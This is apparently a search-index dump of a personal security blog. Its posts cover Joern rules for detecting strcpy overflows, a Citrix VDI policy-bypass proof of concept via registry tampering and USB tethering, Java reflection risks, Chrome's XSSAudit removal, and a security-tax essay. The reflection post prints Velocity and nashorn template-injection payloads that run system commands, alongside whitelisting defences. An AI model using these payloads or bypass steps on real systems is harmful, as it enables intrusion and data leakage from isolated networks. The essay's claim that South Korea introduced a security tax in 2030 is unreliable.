developers, and a lack of cohesive standards can lead to deteriorating code quality, including security levels. Consequently, these organizations face higher risks due to security vulnerabilities and subpar code quality.\nRisks of the strcpy Function The strcpy function is used to copy strings. However, the main issue with this function is that it does not check memory boundaries. This means that if the original string\u0026rsquo;s size exceeds the size of the destination memory, a buffer overflow bug can occur. This may result in errors during program execution or cause the program to malfunction.\nTo resolve this issue, the C11 standard provides the strcpy_s function. The strcpy_s function was created to address the shortcomings of strcpy, and when using this function, the size of the destination memory must be specified as the second argument. This helps prevent buffer overflow issues.\nStatic Analysis Tools Using Joern, a comprehensive Code Property Graph (CPG) integrates syntax, control flow, and data flow into a unified structure, thoroughly detecting complex security vulnerabilities and code issues. Joern‚Äôs customizable queries allow precise vulnerability detection tailored to specific project needs, and its scalability enables efficient analysis of large codebases. The tool\u0026rsquo;s functionality automates and integrates various stages of the development lifecycle, helping detect issues early and improve overall code quality. Joern supports multiple programming languages, making it versatile for various development environments.\nHowever, it is not necessary to use Joern exclusively. Similar tools like CodeQL and Checkmarx also provide powerful static analysis capabilities. For more details, refer to the Joern Documentation and related materials on graph databases and code analysis techniques.\nCustom Rule Examples Category Good (Security Level: High, Code Quality: High) Normal (Security Level: Low, Code Quality: Low) Bad (Security Level: Critical, Code Quality: Low) Description Input validation must always be performed. Input size should always be checked, or functions that check input size (such as strncpy, strlcpy, strcpy_s) should be used instead. Input size is checked, but dangerous functions are still used. Developers may be vulnerable to exceptional cases where input size is misunderstood for data types. Failing to check input size before buffer copy (\u0026lsquo;Traditional Buffer Overflow\u0026rsquo;). This can lead to critical security vulnerabilities, such as privilege escalation and unintended command execution. Case strlen_malloc_strncpy ZIP_EXTERN zip_int64_t zip_add_dir(struct‚ÄØzip *za,‚ÄØconst‚ÄØchar‚ÄØ*name) { size_t‚ÄØMAXSIZE = 1024; char* sInput = (char*)malloc(MAXSIZE); memset(sInput, 0, MAXSIZE); \u0026hellip; \u0026hellip; const‚ÄØjbyte* javaStr; jint result = -1; javaStr = (*env)-\u0026gt;GetStringUTFChars(env, drmFileName, NULL); if(javaStr == NULL) goto‚ÄØend; strncpy(sInput, javaStr, MAXSIZE); \u0026hellip;\u0026hellip; \u0026hellip;\u0026hellip; } strlen_malloc_strcpy ZIP_EXTERN zip_int64_t zip_add_dir(struct‚ÄØzip *za,‚ÄØconst‚ÄØchar‚ÄØ*name) { int‚ÄØlen; char‚ÄØ*s; \u0026hellip;\u0026hellip; s = NULL; len =‚ÄØstrlen(name); if‚ÄØ(name[len-1] !=‚ÄØ\u0026lsquo;/\u0026rsquo;) { if‚ÄØ((s=(char‚ÄØ*)malloc(len+2)) == NULL) { _zip_error_set(\u0026amp;za-\u0026gt;error, ZIP_ER_MEMORY, 0); return‚ÄØ-1; }‚ÄØstrcpy(s, name); \u0026hellip;\u0026hellip; } malloc(Ï†ïÏàò)_strcpy Java_com_skt_skaf_OA00050017_engine_ComicEngineJNI_Open (JNIEnv* env, drmFileName, \u0026hellip;\u0026hellip;) { char* sInput = (char*)malloc(1024); \u0026hellip;\u0026hellip; const‚ÄØjbyte* javaStr; \u0026hellip;\u0026hellip; javaStr = (*env)-\u0026gt;GetStringUTFChars(env, drmFileName, ((void*)0)); \u0026hellip;\u0026hellip; strcpy(sInput, javaStr); \u0026hellip;\u0026hellip; } Source/ Sink Source : * Sink :‚ÄØstrncpy, strlcpy, strcpy_s Source : * Sink : strcpy, strcat, sprintf, vsprintf, gets Source : GetStringUTFChars Sink : strcpy, strcat, sprintf, vsprintf, gets Pattern The parameter for malloc is an additive expression, and its data flow has strlen preceding it and strcpy following it. The parameter for malloc is an additive expression, and its data flow has strlen preceding it and strcpy following it. The malloc parameter takes an integer input, and the data flow uses strcpy. Known functions with no length limit (such as GetStringUTFChars) are used as the input to strcpy. Rule echo‚ÄØ\u0026quot;‚ÄØ\\ getCallsTo(\u0026lsquo;malloc\u0026rsquo;)‚ÄØ\\ .ithArguments(\u0026lsquo;0\u0026rsquo;).children().has(\u0026rsquo;type\u0026rsquo;,\u0026lsquo;AdditiveExpression\u0026rsquo;).statements()‚ÄØ\\ .or(‚ÄØ\\ __.in(\u0026lsquo;REACHES\u0026rsquo;).has(\u0026lsquo;code\u0026rsquo;,new P(CONTAINS_REGEX,\u0026rsquo;.*strlen.*\u0026rsquo;))‚ÄØ\\ .out(\u0026lsquo;REACHES\u0026rsquo;).has(\u0026lsquo;code\u0026rsquo;, new P(CONTAINS_REGEX,\u0026rsquo;.*malloc.*\u0026rsquo;)),‚ÄØ\\ __.has(\u0026lsquo;code\u0026rsquo;,new P(CONTAINS_REGEX,\u0026rsquo;.*strlen.*\u0026rsquo;))‚ÄØ\\ ).out(\u0026lsquo;REACHES\u0026rsquo;)‚ÄØ\\ .has(\u0026lsquo;code\u0026rsquo;, new P(CONTAINS_REGEX,\u0026rsquo;.*strncpy.* .*strlcpys.* .*strcpy_s.*\u0026rsquo;))‚ÄØ\\ .id()\u0026quot; Ï∞∏Í≥† https://randomascii.wordpress.com/2013/04/03/stop-using-strncpy-already/ https://www.cse.psu.edu/~gxt29/papers/jdksecurity.pdf ","permalink":"https://windshock.github.io/en/post/2024-05-22-can-development-culture-influence-security-levels/","summary":"\u003ch1 id=\"can-development-culture-influence-security-levels\"\u003eCan Development Culture Influence Security Levels?\u003c/h1\u003e\n\u003ch2 id=\"evaluating-code-quality-and-security-levels-using-static-analysis-tools-joern\"\u003eEvaluating Code Quality and Security Levels Using Static Analysis Tools (Joern)\u003c/h2\u003e\n\u003ch3 id=\"background\"\u003eBackground\u003c/h3\u003e\n\u003cp\u003eUnlike companies like \u003ca href=\"/en/post/2024-05-22-can-development-culture-influence-security-levels/#google-development-culture\"\u003eGoogle\u003c/a\u003e with an open and collaborative development culture, in some organizations that lack such culture, the quality of the code, including security levels, can be heavily influenced by the individual‚Äôs capability. In particular, developers who tend to write poor quality code, such as using the \u003ca href=\"/en/post/2024-05-22-can-development-culture-influence-security-levels/#strcpy-function-risk\"\u003estrcpy function\u003c/a\u003e, can have their code quality and security levels assessed by utilizing \u003ca href=\"/en/post/2024-05-22-can-development-culture-influence-security-levels/#static-analysis-tools\"\u003estatic analysis tools\u003c/a\u003e (Joern, CodeQL, etc.) with \u003ca href=\"/en/post/2024-05-22-can-development-culture-influence-security-levels/#custom-rule-examples\"\u003ecustom rules\u003c/a\u003e. As a result, even in situations where the development culture is lacking, code quality and security levels can be improved, leading to the production of good-quality code.\u003c/p\u003e","title":"Can Development Culture Influence Security Levels?"},{"content":"Bypassing Citrix Policy is Not a Vulnerability but a Legal Violation Note!! Based on discussions with Citrix through VINCE from cert.org, it was concluded that this is not classified as a vulnerability because it requires administrative privileges. Therefore, I can share this information without security concerns. However, for security reasons, I do not recommend using Xendesktop (VDI) in special environments such as logically isolated or closed networks. If VDI must be used in such environments, please ensure that administrator privileges are removed and security-specific software is installed.\nWhile the need for administrative privileges may reduce the risk, it does not eliminate the potential impact. Below is a detailed technical explanation of how the Citrix policy can be bypassed.\nDescription The Citrix VDI Agent (PicaSvc2.exe) seems to follow a structure where it receives policies from the Citrix management server, records them in the registry (HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Citrix\\1\\User), and applies these policies by reading from the registry. An attacker can bypass security policies for drives, network access, clipboard operations, etc., enforced by the Citrix Policy Server through manipulation of the registry (refer to the proof of concept [POC] below).\nAccording to Citrix\u0026rsquo;s Common Criteria Certification documentation, protections are designed to prevent an attacker from altering this configuration data (Configdata). This type of bypass could be considered an implementation flaw.\nIf VDI is used in closed or isolated network environments, bypassing Citrix Policy and forcibly connecting the VDI to the internet could expose sensitive internal information to external parties. In South Korea, such actions are a clear violation of the law and would require a reassessment of network isolation measures.\nProof of Concept (POC) An attacker would first need to log into the company\u0026rsquo;s Citrix VDI (running Windows 10) after gaining access to the company‚Äôs account. The VDI environment is typically restricted from network access, printer use, external drives, clipboard access, etc.\nThe attacker logs into the VDI and runs a batch file (download link) that continuously modifies the registry, then disconnects from the VDI session.\nAfter running the batch file to modify the registry, the attacker disconnects from the VDI. Upon reconnection, the registry values have been tampered with, allowing the attacker to bypass Citrix policies.\nExample registry modification:\nWindows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Citrix\\1\\User] \u0026#34;AutoConnectDrives\u0026#34;=dword:00000001 \u0026#34;AllowCdromDrives\u0026#34;=dword:00000001 \u0026#34;AllowFixedDrives\u0026#34;=dword:00000001 \u0026#34;AllowFloppyDrives\u0026#34;=dword:00000001 \u0026#34;AllowNetworkDrives\u0026#34;=dword:00000001 \u0026#34;AllowRemoveableDrives\u0026#34;=dword:00000001 \u0026#34;UseAsyncWrites\u0026#34;=dword:00000001 \u0026#34;ReadOnlyMappedDrive\u0026#34;=dword:00000000 Upon logging back into the VDI, PicaSvc2.exe retrieves the policy settings from the Citrix server and stores them in the registry.\nWhile PicaSvc2.exe is writing and reading policies, the registry values have already been tampered with by the previously executed batch file.\nPicaSvc2.exe then applies the manipulated policies in the VDI environment.\nAdditionally:\nBy modifying the registry of the connecting PC, hardware redirection can be enabled, which allows unauthorized network access. Citrix\u0026rsquo;s default policy allows USB class FFh, which means an iPhone can be used for tethering or a USB-based wireless card could be used to bypass network isolation. To enable iPhone tethering, the attacker would need to install drivers extracted from the iTunes installer: Apple network driver and Apple USB driver. After redirecting the iPhone in the Citrix session, internet access can be obtained even in a network-isolated environment. Impact For companies using VDI to maintain logical network separation, this vulnerability could lead to the leakage of internal information and unauthorized access to internal servers.\nGiven the potential impact, it is crucial to identify and mitigate such attacks in real-time. Below are steps to discover and monitor potential bypass activities.\nDiscovery To discover this issue:\nUse Procmon to monitor the operations of PicaSvc2.exe. Examine the registry keys where the Citrix agent stores its policy settings. Manipulate and observe the effects of changes in these registry values. Design Analysis The Citrix Common Criteria Certification document includes measures to prevent unauthorized modification of configuration data. According to Citrix\u0026rsquo;s Common Criteria Certification Information, the integrity and confidentiality of the data required for setup and assignment of a virtual desktop or application are maintained during transmission between servers. This design also includes prevention measures against attackers, application users, or desktop users from modifying the configuration data.\nDespite Citrix\u0026rsquo;s implementation of security features as outlined above, legal considerations must also be addressed, particularly in regions like South Korea where strict network isolation laws apply.\nCitrix‚Äôs security objectives, including O.Secure_Setup_Data, OE.TLS, and OE.Encryption, ensure the confidentiality and integrity of the configuration data during processing and transmission between servers.\nFor more details on the security objectives and the roles of management functions, see:\nFMT_SMF.1/Authorise: Management of the endpoint data access control policy FMT_MSA.1/Desktop FMT_MSA.3/Desktop FMT_MSA.1/Application FMT_MSA.3/Application FPT_ITT.1 Legal Considerations In South Korea, the Financial Supervisory Service (FSS) has introduced measures under the Electronic Financial Transactions Act that provide companies with the option of implementing logical network separation. Financial institutions are required to block unauthorized access and prevent incidents by adopting network isolation measures to protect sensitive data from external attacks.\nSince the attack requires administrative privileges, companies should review their policy regarding the removal of administrative privileges for PC users in logically separated network environments. Furthermore, there is a need for legal improvements to include regulations that prevent the misuse of these systems.\nLimitation Even with administrative and installation privileges restricted, it is still difficult to fully prevent data leaks through methods such as capturing screen images. More detailed analysis and solutions regarding logical network isolation models can be found in this report.\nThese limitations suggest that even with administrator rights removed, organizations remain vulnerable. This highlights the importance of addressing these issues at both a technical and regulatory level, as seen in recent banking sector responses to similar incidents.\nRelated Issues Following a 2011 hacking incident at Nonghyup, several major banks in South Korea began implementing internal-external network separation to prevent the leakage, theft, or tampering of personal information. Network isolation remains a key recommendation to ensure the safety of personal data. See relevant guidelines here and information on ISMS-P certification here.\nAdditional information on Citrix Common Criteria certification can be found here and here.\n","permalink":"https://windshock.github.io/en/post/2023-04-27-bypassing-citrix-policy-is-not-a-vulnerability-but-it-can-be-a-violation-of-the-law/","summary":"\u003ch3 id=\"bypassing-citrix-policy-is-not-a-vulnerability-but-a-legal-violation\"\u003eBypassing Citrix Policy is Not a Vulnerability but a Legal Violation\u003c/h3\u003e\n\u003ch4 id=\"note\"\u003eNote!!\u003c/h4\u003e\n\u003cp\u003eBased on discussions with Citrix through \u003ca href=\"https://kb.cert.org/vince/comm/case/1022/\"\u003eVINCE\u003c/a\u003e from cert.org, it was concluded that this is not classified as a vulnerability because it requires administrative privileges. Therefore, I can share this information without security concerns. However, for security reasons, I do not recommend using Xendesktop (VDI) in special environments such as logically isolated or closed networks. If VDI must be used in such environments, please ensure that administrator privileges are removed and security-specific software is installed.\u003c/p\u003e","title":"Bypassing citrix policy is not a vulnerability, but it can be a violation of the law"},{"content":"Ôªø Strengthening Cybersecurity Through Government NGOs and Bug Bounty Programs: A Look at Security Taxes and Their Implementation in Various Countries\nIn today\u0026rsquo;s digital age, information security has become a critical concern for individuals, businesses, and governments alike. Cyber attacks and data breaches have become increasingly common and sophisticated, and the consequences can be devastating. This is why it is essential to have robust cybersecurity measures in place to protect against these threats.\nOne approach that is gaining popularity is the use of government NGOs (non-governmental organizations) and bug bounty programs. These programs are designed to encourage individuals and organizations to identify and report vulnerabilities and weaknesses in digital systems, allowing for timely and effective remediation. They are an essential component of any comprehensive cybersecurity strategy, and their importance cannot be overstated.\nIn some countries, governments have also implemented security taxes to fund these programs. These taxes are charged on businesses that are deemed to be at high risk of cyber attacks, and the proceeds are used to establish and support government NGOs and bug bounty programs. While this approach has been met with some controversy, there is no denying its effectiveness in raising the necessary funds to protect against cyber threats.\nOne example of a country that has implemented a security tax is South Korea. In 2030, the South Korean government introduced a tax on companies that are deemed to be at high risk of cyber attacks. The tax ranges from 0.09% to 2% of the company\u0026rsquo;s annual revenue, depending on their size and level of risk. The funds collected from the tax are used to support the country\u0026rsquo;s national cybersecurity agency, as well as various government NGOs and bug bounty programs.\nThe importance of NGOs in this context cannot be overstated. NGOs are essential in bridging the gap between the government and the private sector when it comes to cybersecurity. They are better equipped to handle the technical aspects of cybersecurity and can work closely with businesses and organizations to identify vulnerabilities and weaknesses in their systems. This partnership between the government and NGOs is crucial in protecting against cyber threats.\nThe R\u0026amp;R (roles and responsibilities) of government NGOs and bug bounty programs can vary depending on the country and the specific program. In general, government NGOs are responsible for conducting research and analysis on cybersecurity threats and developing best practices and guidelines. They also work closely with businesses and organizations to provide guidance and assistance in implementing these best practices.\nBug bounty programs, on the other hand, are designed to incentivize individuals and organizations to identify and report vulnerabilities in digital systems. These programs offer rewards, often in the form of cash, to those who identify and report valid vulnerabilities. This approach has proven to be highly effective in identifying and addressing vulnerabilities before they can be exploited by cybercriminals.\nIt is important to note that these programs should not charge security taxes on individuals. The burden of funding these programs should be on businesses and organizations that are at high risk of cyber attacks.\nIn summary, security taxes, NGOs, and bug bounty programs are all important tools for strengthening cybersecurity in the face of an increasingly complex threat landscape. By working together, government agencies, NGOs, and private companies can help identify and address vulnerabilities in a timely and effective manner, thereby reducing the risk of costly and damaging cyberattacks.\n","permalink":"https://windshock.github.io/en/post/2023-04-18-strengthening-cybersecurity-through-government-ngos-and-bug-bounty-programs/","summary":"\u003cp\u003eÔªø\nStrengthening Cybersecurity Through Government NGOs and Bug Bounty Programs: A Look at Security Taxes and Their Implementation in Various Countries\u003c/p\u003e\n\u003cp\u003eIn today\u0026rsquo;s digital age, information security has become a critical concern for individuals, businesses, and governments alike. Cyber attacks and data breaches have become increasingly common and sophisticated, and the consequences can be devastating. This is why it is essential to have robust cybersecurity measures in place to protect against these threats.\u003c/p\u003e","title":"Strengthening cybersecurity through government ngos and bug bounty programs"},{"content":"Security Threats and Mitigation Strategies for Java Reflection The Java Reflection API is a powerful tool that allows dynamic manipulation of classes, methods, and interfaces at runtime. However, due to its flexibility, it introduces significant security risks, as attackers can exploit it to gain unauthorized access to systems. In this article, we will explore the security threats posed by Java Reflection and outline strategies to mitigate these risks.\nThe Risks of Using Reflection API Reflection is commonly used to inspect the structure of objects or dynamically invoke methods at runtime. However, without a proper Security Manager, sensitive methods (like execute, eval, etc.) can be accessed, leading to potential Remote Code Execution (RCE) attacks.\nFor example, the following code demonstrates the risks of using Reflection to execute system commands:\n#set($exp=\u0026#34;test\u0026#34;) $exp.getClass().forName(\u0026#34;java.lang.Runtime\u0026#34;) .getMethod(\u0026#34;getRuntime\u0026#34;, null) .invoke(null, null) .exec(\u0026#34;calc\u0026#34;) This code uses the Velocity template engine with Reflection to execute a system command, which can be exploited by attackers if proper security measures are not in place. However, Java 9 introduced enhanced security mechanisms to mitigate such risks.\nJava 9 and the StackWalker API In Java 9, the traditional Reflection.getCallerClass method was deprecated and replaced with the StackWalker API, which provides a more secure way to inspect the calling class. Previously, security checks were only performed on the immediate caller, but with StackWalker, the entire call stack can be examined for more comprehensive security.\nFor more details, refer to the Stack Walking API guide. This ensures that all potential vulnerabilities along the call chain are addressed, as demonstrated by the CVE-2012-4681 exploit. In this vulnerability, issues with caller-sensitive methods in Java were exploited, leading to attacks, but since Java 8, the @CallerSensitive annotation has helped safeguard such methods.\nThe Problem with Blacklist-Based Security and the Need for Whitelisting Traditional blacklist-based security approaches focus on blocking specific dangerous elements but often fail to cover all attack vectors. For instance, blacklisting certain methods or classes can easily be bypassed by attackers who find alternate methods that aren\u0026rsquo;t blocked.\nExpression Language Injection and other dynamic code execution attacks frequently exploit this limitation. As demonstrated in the Blackhat JSON Attacks, blacklist filtering methods can be bypassed, and attackers can execute malicious commands through unblocked pathways.\nFor this reason, a whitelisting approach is generally more effective. Whitelisting only allows access to explicitly trusted classes and methods, while blocking everything else by default. This significantly reduces the risk of code execution through unapproved methods or reflection-based attacks.\nThe Role and Limitations of SecureUberspector SecureUberspector in Apache Velocity is a tool that limits class loading and Reflection, especially in scenarios where untrusted or numerous template writers are involved. It prevents the execution of arbitrary objects and reflection on those objects, enhancing security. However, it has limitations.\nFor example, in CVE-2019-17558, SecureUberspector could not fully block all reflection-based attacks. Particularly, it does not prevent the use of javax.script.ScriptEngineManager, which can be exploited to execute arbitrary code. GHSL-2020-048 demonstrates how attackers can bypass SecureUberspector using this vulnerability:\n#set($engine = $scriptEngineManager.getEngineByName(\u0026#34;nashorn\u0026#34;)) #engine.eval(\u0026#34;java.lang.Runtime.getRuntime().exec(\u0026#39;calc\u0026#39;)\u0026#34;) This script bypasses SecureUberspector and allows remote command execution. Similarly, attackers can bypass security mechanisms using Groovy scripts, as noted in the SecureLayer7 analysis.\nApplying Whitelisting: Concrete Strategies Whitelisting is the preferred security model, allowing only trusted classes, methods, and objects while blocking all others. Below are specific methods for applying whitelisting in Java.\nUsing the Security Manager\nThe Java Security Manager can be employed to restrict access to sensitive resources and only allow specific classes or methods to be executed.\nSystem.setSecurityManager(new SecurityManager()); // Define permissions for trusted methods/classes PermissionCollection perms = new Permissions(); perms.add(new RuntimePermission(\u0026#34;accessDeclaredMembers\u0026#34;)); // Allow reflection access perms.add(new RuntimePermission(\u0026#34;createClassLoader\u0026#34;)); // Allow class loader creation AccessController.doPrivileged(new PrivilegedAction\u0026lt;Void\u0026gt;() { public Void run() { // Execute only within whitelisted methods secureMethod(); return null; } }, new AccessControlContext(new ProtectionDomain[] {new ProtectionDomain(null, perms)})); Controlling Access with Reflection\nWhen using Reflection, you can manually restrict access to certain classes and methods, rejecting any that are not explicitly allowed.\nprivate static final Set\u0026lt;String\u0026gt; allowedMethods = Set.of( \u0026#34;java.lang.String\u0026#34;, \u0026#34;java.util.List\u0026#34; // Whitelisted classes ); public static Object invokeMethod(Method method, Object target, Object... args) throws Exception { if (!allowedMethods.contains(method.getDeclaringClass().getName())) { throw new SecurityException(\u0026#34;Unauthorized method invocation: \u0026#34; + method.getName()); } return method.invoke(target, args); // Only whitelisted methods are executed } Whitelisting in Script Engines\nScript engines such as javax.script.ScriptEngineManager can also implement whitelisting to ensure that only safe scripts or commands are executed.\nScriptEngine engine = new ScriptEngineManager().getEngineByName(\u0026#34;nashorn\u0026#34;); engine.setBindings(new SimpleBindings(allowedMethods), ScriptContext.ENGINE_SCOPE); // Apply whitelisting engine.eval(\u0026#34;some safe script here\u0026#34;); Whitelisting in Template Engines\nTools like SecureUberspector can be configured to enforce a whitelisting approach by limiting access to trusted methods and objects in template engines.\npublic Iterator getIterator(Object obj, Info i) { if (obj != null) { SecureIntrospectorControl sic = (SecureIntrospectorControl) introspector; if (sic.checkObjectExecutePermission(obj.getClass(), null)) { return super.getIterator(obj, i); } else { log.warn(\u0026#34;Cannot retrieve iterator from \u0026#34; + obj.getClass() + \u0026#34; due to security restrictions.\u0026#34;); } } return null; } Protecting with StackWalker: Caller Validation Introduced in Java 9, the StackWalker API provides a secure way to inspect the call stack, offering better control over method invocations. StackWalker can be used to ensure that methods are only invoked by trusted callers.\nBelow is an example using StackWalker to validate the caller of a method:\nimport java.lang.StackWalker; import java.util.List; import java.util.Set; import java.util.stream.Collectors; public class SecurityManagerUtil { // Whitelisted caller classes private static final Set\u0026lt;String\u0026gt; allowedCallers = Set.of(\u0026#34;com.example.TrustedClass\u0026#34;); public static void checkCaller() { List\u0026lt;String\u0026gt; stackTrace = StackWalker.getInstance(StackWalker.Option.RETAIN_CLASS_REFERENCE) .walk(frames -\u0026gt; frames.map(frame -\u0026gt; frame.getDeclaringClass().getName()) .collect(Collectors.toList())); // If caller is not whitelisted, throw an exception boolean isCallerAllowed = stackTrace.stream().anyMatch(allowedCallers::contains); if (!isCallerAllowed) { throw new SecurityException(\u0026#34;Unauthorized caller detected: \u0026#34; + stackTrace); } } public static void secureMethod() { checkCaller(); // Verify caller before execution System.out.println(\u0026#34;Secure method executed.\u0026#34;); } } This example ensures that only trusted classes are allowed to invoke secureMethod(). If an unauthorized class tries to access the method, an exception is thrown.\nConclusion: Proper Use and Protection of Reflection The Java Reflection API is a flexible and powerful tool, but it introduces significant security risks, especially when combined with template engines like Velocity. Blacklist-based approaches are prone to bypasses, while whitelisting provides stronger protection by allowing only trusted elements to be executed. Furthermore, leveraging the StackWalker API enhances security by validating method invocations and blocking unauthorized access.\nBy combining whitelisting with tools like StackWalker, you can ensure that your Java applications are more secure and resilient against reflection-based attacks.\n","permalink":"https://windshock.github.io/en/post/2019-09-03-security-threats-and-mitigation-strategies-for-java-reflection/","summary":"\u003ch3 id=\"security-threats-and-mitigation-strategies-for-java-reflection\"\u003eSecurity Threats and Mitigation Strategies for Java Reflection\u003c/h3\u003e\n\u003cp\u003eThe \u003cstrong\u003eJava Reflection API\u003c/strong\u003e is a powerful tool that allows dynamic manipulation of classes, methods, and interfaces at runtime. However, due to its flexibility, it introduces significant security risks, as attackers can exploit it to gain unauthorized access to systems. In this article, we will explore the security threats posed by Java Reflection and outline strategies to mitigate these risks.\u003c/p\u003e\n\u003ch4 id=\"the-risks-of-using-reflection-api\"\u003eThe Risks of Using Reflection API\u003c/h4\u003e\n\u003cp\u003eReflection is commonly used to inspect the structure of objects or dynamically invoke methods at runtime. However, without a proper \u003cstrong\u003eSecurity Manager\u003c/strong\u003e, sensitive methods (like \u003ccode\u003eexecute\u003c/code\u003e, \u003ccode\u003eeval\u003c/code\u003e, etc.) can be accessed, leading to potential \u003cstrong\u003eRemote Code Execution (RCE)\u003c/strong\u003e attacks.\u003c/p\u003e","title":"Security threats and mitigation strategies for java reflection"},{"content":"Why Was the XSSAudit Feature Removed in Chrome? The Google Security Team proposed to the Chrome development team to remove the XSSAudit feature. Although the only rationale provided was that the feature could be bypassed (as argued in a paper by evn@google.com), it initially seemed unlikely that removal would proceed. However, it was ultimately decided that the feature would be completely eliminated in Chrome.\nThe main point of the paper is that bypass methods using targets within new JavaScript frameworks are difficult to defend against. Therefore, it proposes a shift from the existing mitigation approach (the xssaudit filter) to an isolation/prevention method, namely Content Security Policy (CSP).\nWasn\u0026rsquo;t XSSAudit Useful? From the perspective of companies like Google, if the XSSAudit feature incurs maintenance costs and results in poorer performance compared to competitors‚Äô browsers (e.g., Microsoft‚Äôs), it is only natural to want to remove it. (In fact, this feature was already removed in MS EDGE.)\nFor ethical hackers and attackers, bypassing XSSAudit is only possible under very unusual circumstances, making the feature a particularly annoying and troublesome obstacle.\nFor security professionals and defenders, implementing the challenging CSP adds significant workload. Moreover, CSP is not a perfect defense mechanism. The Content Security Policy Level 2 RFP also describes CSP as one way to enhance defenses:\nContent Security Policy (CSP) is not intended as a first line of defense against content injection vulnerabilities. Instead, CSP is best used as defense-in-depth, to reduce the harm caused by content injection attacks. As a first line of defense against content injection, server operators should validate their input and encode their output.\nApart from browser developers like Google, the XSSAudit feature was useful to nearly everyone. If the only reason for its removal is that it can be bypassed, it seems like a decision driven by corporate interests. Wasn\u0026rsquo;t Google supposed to follow the motto ‚ÄúDon\u0026rsquo;t be evil, do the right thing‚Äù?\nRegardless, We Now Must Study CSP Implementation Intensively :( How do I Content Security Policy\nSo we broke all CSPs ‚Ä¶\n","permalink":"https://windshock.github.io/en/post/2019-08-08-about-the-xssaudit/","summary":"\u003ch2 id=\"why-was-the-xssaudit-feature-removed-in-chrome\"\u003eWhy Was the XSSAudit Feature Removed in Chrome?\u003c/h2\u003e\n\u003cp\u003eThe Google Security Team proposed to the Chrome development team to remove the \u003ca href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=898081\"\u003eXSSAudit feature\u003c/a\u003e. Although the only rationale provided was that the feature could be bypassed (as argued in a paper by \u003ca href=\"mailto:evn@google.com\"\u003eevn@google.com\u003c/a\u003e), it initially seemed unlikely that removal would proceed. However, it was ultimately decided that the feature would be completely eliminated in Chrome.\u003c/p\u003e\n\u003cp\u003eThe main point of the \u003ca href=\"/pdf/p1709-lekiesA.pdf\"\u003epaper\u003c/a\u003e is that bypass methods using targets within new JavaScript frameworks are difficult to defend against. Therefore, it proposes a shift from the existing mitigation approach (the xssaudit filter) to an isolation/prevention method, namely Content Security Policy (CSP).\u003c/p\u003e","title":"About the XSSAudit"},{"content":"üöÄ Security Vulnerability Analyst and Security Automation Expert üöÄ\nWith over 17 years of experience, I focus on vulnerability analysis, secure coding, and building automated security solutions. My work revolves around providing coded security solutions that help organizations address security challenges faster and more effectively. By following key security principles, I emphasize a shift-left approach to integrate security earlier in the development process, while leveraging data-driven security to build smarter systems.\nüîë Shift Left - Secure Coding Guidelines for Developers and Stakeholders: Security should be integrated early in the development process. To achieve this, I provide secure coding guidelines targeted at developers and business stakeholders, offering immediate support for addressing vulnerabilities. These guidelines help strengthen security from the initial stages of development, promoting a shift-left approach to security.\nüîë Security Automation - Building Automated Security Solutions: Security automation is critical in today‚Äôs development environments. I have established automated security solutions within DevSecOps environments, seamlessly integrating security into development pipelines. Through automated malware detection and security log analysis, I have significantly reduced manual efforts and minimized response times to security threats.\nüîë Data-Driven Security - Fortify Vulnerability Clustering and Anomalous Traffic Analysis: I focus on data-driven security and have developed tools using Fortify for vulnerability clustering and analyzing anomalous traffic. These tools allow for faster, more systematic analysis and response to security vulnerabilities, ensuring proactive prevention of security issues across various environments.\nüîë Talent Donation - CVE, CWE Reporting and GitHub Tool Sharing: I actively contribute to the security community by reporting CVE and CWE vulnerabilities. I also develop and share tools on GitHub to help others address these vulnerabilities. This talent donation strengthens the global security ecosystem and supports organizations in resolving critical security challenges.\nI am dedicated to coding solutions for discovered vulnerabilities and sharing these tools to help organizations implement effective security measures. By promoting shift-left security, security automation, and data-driven analysis, I continue to drive security innovation. Let‚Äôs connect and explore ways to enhance security together!\nüìß Email: windshock@gmail.com\nüîó Website: https://windshock.github.io/\nüíº LinkedIn: https://www.linkedin.com/in/windshock/\n","permalink":"https://windshock.github.io/en/about/","summary":"Learn more about my professional background and expertise.","title":"About"}]